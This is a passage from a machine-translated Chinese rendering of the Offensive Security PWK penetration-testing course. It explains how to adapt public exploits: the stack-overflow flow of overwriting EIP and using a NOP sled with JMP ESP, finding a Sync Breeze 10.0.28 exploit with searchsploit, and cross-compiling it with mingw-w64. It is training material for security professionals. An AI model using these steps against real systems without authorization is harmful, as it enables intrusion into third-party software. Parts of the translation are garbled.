<div style="position:absolute;top:16974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准堆栈溢出的一般流程（在用户模式下运行的应用程序中，没有</font></font></nobr></div>
<div style="position:absolute;top:16993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DEP 和 ASLR 等缓解措施非常简单。</font><font style="vertical-align: inherit;">该漏洞利用将：</font></font></nobr></div>
<div style="position:absolute;top:17026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个大缓冲区来触发溢出。</font></font></nobr></div>
<div style="position:absolute;top:17054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.通过填充大缓冲区覆盖堆栈上的返回地址来控制EIP</font></font></nobr></div>
<div style="position:absolute;top:17074;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有适当的偏移量。</font></font></nobr></div>
<div style="position:absolute;top:17102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 将选定的有效载荷包含在由可选 NOP 雪橇前置的缓冲区中。</font></font></nobr></div>
<div style="position:absolute;top:17130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4、依次选择正确的返回地址指令如JMP ESP（或不同寄存器）</font></font></nobr></div>
<div style="position:absolute;top:17150;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将执行流重定向到我们的有效负载中。</font></font></nobr></div>
<div style="position:absolute;top:17182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，在修复漏洞利用时，根据漏洞的性质，我们可能需要</font></font></nobr></div>
<div style="position:absolute;top:17202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改已部署缓冲区的元素以适合我们的目标，例如文件路径、IP 地址和端口，</font></font></nobr></div>
<div style="position:absolute;top:17221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URLs 等。如果这些修改改变了我们的偏移量，我们必须调整缓冲区长度以确保我们</font></font></nobr></div>
<div style="position:absolute;top:17241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用所需的字节覆盖返回地址。</font></font></nobr></div>
<div style="position:absolute;top:17273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们可以相信漏洞利用中使用的返回地址是正确的，但越负责任</font></font></nobr></div>
<div style="position:absolute;top:17293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一种方法是自己找到返回地址，特别是如果使用的地址不是</font></font></nobr></div>
<div style="position:absolute;top:17312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受攻击的应用程序或其 DLL。</font><font style="vertical-align: inherit;">最可靠的方法之一是克隆目标</font></font></nobr></div>
<div style="position:absolute;top:17331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机中的本地环境，然后在易受攻击的软件上使用调试器</font></font></nobr></div>
<div style="position:absolute;top:17351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取返回地址指令的内存地址。</font></font></nobr></div>
<div style="position:absolute;top:17384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还必须考虑更改原始漏洞利用代码中包含的有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:17416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如在前面的模块中提到的，公共漏洞利用存在固有的危险，因为它们经常</font></font></nobr></div>
<div style="position:absolute;top:17436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含必须进行逆向工程以确定它们如何工作的十六进制编码的有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:17455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，我们必须始终审查公共漏洞利用中使用的有效载荷，或者更好的是，插入我们的</font></font></nobr></div>
<div style="position:absolute;top:17474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自己的。</font></font></nobr></div>
<div style="position:absolute;top:17507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们这样做时，我们显然会包括我们自己的 IP 地址和端口号，可能还有</font></font></nobr></div>
<div style="position:absolute;top:17527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排除某些不良字符，我们可以自行确定或从漏洞利用中收集</font></font></nobr></div>
<div style="position:absolute;top:17546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注释。</font></font></nobr></div>
<div style="position:absolute;top:17579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然建议尽可能生成我们自己的有效载荷，但也有使用自定义的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:17598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷是成功攻陷易受攻击的应用程序的关键。</font><font style="vertical-align: inherit;">如果是这种情况，</font></font></nobr></div>
<div style="position:absolute;top:17617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们唯一的选择是对有效载荷进行逆向工程，以确定它的功能以及是否安全</font></font></nobr></div>
<div style="position:absolute;top:17637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font><font style="vertical-align: inherit;">这很困难并且超出了本模块的范围，因此我们将重点关注 shellcode</font></font></nobr></div>
<div style="position:absolute;top:17656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">替代品。</font></font></nobr></div>
<div style="position:absolute;top:17689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们重新利用漏洞时，必须牢记所有这些考虑因素。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:17723;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:17723;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入和检查漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此示例中，我们将再次以 Sync Breeze Enterprise 10.0.28 为目标，就像在之前的模块中所做的那样</font></font></nobr></div>
<div style="position:absolute;top:17781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但我们将专注于不同的漏洞利用。</font><font style="vertical-align: inherit;">这将为我们提供另一个有效的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:17800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标环境并允许我们完成修改过程。</font></font></nobr></div>
<div style="position:absolute;top:17833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按产品和版本搜索，我们注意到有针对此特定的两个可用漏洞</font></font></nobr></div>
<div style="position:absolute;top:17852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞，其中之一是用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码的</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">457</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit "Sync Breeze Enterprise 10.0.28"</font></font></font></b></nobr></div>
<div style="position:absolute;top:18143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:18160;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:18160;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/）</font></font></nobr></div>
<div style="position:absolute;top:18177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -- ----------------------------------</font></font></nobr></div>
<div style="position:absolute;top:18194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sync Breeze Enterprise 10.0.28 - 远程缓冲结束 | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/42928.py</font></font></nobr></div>
<div style="position:absolute;top:18211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sync Breeze Enterprise 10.0.28 - 远程缓冲结束 | </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/windows/dos/42341.c</font></font></font></b></nobr></div>
<div style="position:absolute;top:18228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:18247;left:199"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 426 - 使用 searchsploit 搜索我们易受攻击的软件的可用漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们已经熟悉该漏洞的工作原理以及它是如何被利用的，所以我们</font></font></nobr></div>
<div style="position:absolute;top:18296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供了一个很好的机会来了解脚本语言之间的差异，例如</font></font></nobr></div>
<div style="position:absolute;top:18315;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Python</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和编译语言（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C），</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不会增加解开新</font><font style="vertical-align: inherit;">语言</font><font style="vertical-align: inherit;">的复杂性</font></font></nobr></div>
<div style="position:absolute;top:18334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性。</font></font></nobr></div>
<div style="position:absolute;top:18367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这两种语言之间存在很多差异，但我们将重点关注两种主要语言</font></font></nobr></div>
<div style="position:absolute;top:18387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会影响我们的差异，包括内存管理和字符串操作。</font></font></nobr></div>
<div style="position:absolute;top:18419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个关键区别是脚本语言是通过解释器执行的，而不是通过解释器执行的。</font></font></nobr></div>
<div style="position:absolute;top:18439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译成一个独立的可执行文件。</font><font style="vertical-align: inherit;">因为脚本语言需要解释器，</font></font></nobr></div>
<div style="position:absolute;top:18458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着我们无法</font><font style="vertical-align: inherit;">在</font><font style="vertical-align: inherit;">未安装</font><i><font style="vertical-align: inherit;">Python</font></i><font style="vertical-align: inherit;">的环境中</font><font style="vertical-align: inherit;">运行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Python</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本</font><font style="vertical-align: inherit;">。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:18477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会限制我们在该领域，特别是如果我们需要一个独立的漏洞利用（如本地特权</font></font></nobr></div>
<div style="position:absolute;top:18497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">escalation）必须在没有预安装 Python 的环境中运行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:18559;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为替代方案，我们可以考虑使用 PyInstaller</font></font></i></nobr></div>
<div style="position:absolute;top:18578;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(https://www.pyinstaller.org)，它将 Python 应用程序打包成stand-</font></font></i></nobr></div>
<div style="position:absolute;top:18598;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种目标操作系统的单独可执行文件。</font><font style="vertical-align: inherit;">然而，鉴于</font></font></i></nobr></div>
<div style="position:absolute;top:18617;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用代码的细微差别，我们建议手动移植代码以完全理解</font></font></i></nobr></div>
<div style="position:absolute;top:18636;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用将如何针对目标工作。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两种语言之间的另一个区别是，在像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Python</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的脚本语言中</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:18718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接字符串非常简单，通常采用两个字符串之间的加法形式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蟒蛇</font></font></font></b></nobr></div>
<div style="position:absolute;top:18786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">string1 = "这是"</font></font></font></b></nobr></div>
<div style="position:absolute;top:18803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">string2 = "一个测试"</font></font></font></b></nobr></div>
<div style="position:absolute;top:18820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串 3 = 字符串 1 + 字符串 2</font></font></font></b></nobr></div>
<div style="position:absolute;top:18837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 string3</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18854;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个测试</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18873;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 427 - Python 中的字符串连接示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如本模块后面所讨论的，在编程中不允许以这种方式连接字符串</font></font></nobr></div>
<div style="position:absolute;top:18922;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等</font><i><font style="vertical-align: inherit;">语言</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:18955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了开始修改我们的漏洞利用的过程，我们将目标漏洞利用</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">380</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动</font><font style="vertical-align: inherit;">到我们当前的</font></font></nobr></div>
<div style="position:absolute;top:18974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 SearchSploit 方便的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> mirror (copy) 选项</font><font style="vertical-align: inherit;">创建工作目录</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:19055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">380 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2017 年），https://www.exploit-db.com/exploits/42341/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">458</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit -m 42341</font></font></font></b></nobr></div>
<div style="position:absolute;top:19331;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用：Sync Breeze Enterprise 10.0.28 - 远程缓冲区溢出 (PoC)</font></font></nobr></div>
<div style="position:absolute;top:19348;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网址：https://www.exploit-db.com/exploits/42341/</font></font></nobr></div>
<div style="position:absolute;top:19365;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径：/usr/share/exploitdb/exploits/windows/dos/42341.c</font></font></nobr></div>
<div style="position:absolute;top:19382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件类型：C 源代码，UTF-8 Unicode 文本，带有 CRLF 行终止符</font></font></nobr></div>
<div style="position:absolute;top:19416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制到：/home/kali/42341.c</font></font></nobr></div>
<div style="position:absolute;top:19435;left:223"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 428 - 使用 searchsploit 将漏洞利用复制到当前工作目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在漏洞被镜像到我们的主目录，我们可以检查它以确定什么</font></font></nobr></div>
<div style="position:absolute;top:19484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要修改（如果有）来编译漏洞利用并使其在我们的目标中工作</font></font></nobr></div>
<div style="position:absolute;top:19503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font></font></nobr></div>
<div style="position:absolute;top:19536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，在考虑编译之前，我们注意到头文件（例如 winsock2.h </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">381</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:19555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表明此代码旨在在 Windows 上编译：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;inttypes.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:19607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdio.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:19624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;winsock2.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:19641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;windows.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:19660;left:249"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 429 - 在漏洞利用代码的开头显示 C 头文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们可以尝试在 Windows 上编译它，但我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交叉编译</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">382</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个漏洞</font></font></nobr></div>
<div style="position:absolute;top:19709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在卡利。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:19743;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.3</font></font></i></nobr></div>
<div style="position:absolute;top:19743;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交叉编译漏洞利用代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了避免编译问题，一般建议使用本机编译器进行编译</font></font></nobr></div>
<div style="position:absolute;top:19801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码针对的特定操作系统；</font><font style="vertical-align: inherit;">然而，这可能并不总是一种选择。</font></font></nobr></div>
<div style="position:absolute;top:19834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，我们只能访问单个攻击环境（如 Kali），但需要</font></font></nobr></div>
<div style="position:absolute;top:19853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用为不同平台编码的漏洞利用。</font><font style="vertical-align: inherit;">这是交叉编译器可以使用的地方</font></font></nobr></div>
<div style="position:absolute;top:19872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常有帮助。</font></font></nobr></div>
<div style="position:absolute;top:19905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，</font><font style="vertical-align: inherit;">我们将使用非常流行的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mingw-64</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交叉编译器。</font><font style="vertical-align: inherit;">如果还没有</font></font></nobr></div>
<div style="position:absolute;top:19925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装它</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install mingw-w64</font></font></font></b></nobr></div>
<div style="position:absolute;top:19979;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 430 - 在 Kali 中安装 mingw-64 交叉编译器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装完成后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mingw-64</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将代码编译成Windows PE</font></font></nobr></div>
<div style="position:absolute;top:20028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">383</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一步是查看漏洞利用代码是否编译没有错误：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:20079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x2e)：对`_imp__WSAStartup@8'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x3c)：对`_imp__WSAGetLastError@的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x80): 对`_imp__socket@12'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x93): 对`_imp__WSAGetLastError@的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0xbd)：对`_imp__inet_addr@4'的未定义引用</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:20203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">381 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms737629 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:20223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">382 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cross_compiler</font></font></font></nobr></div>
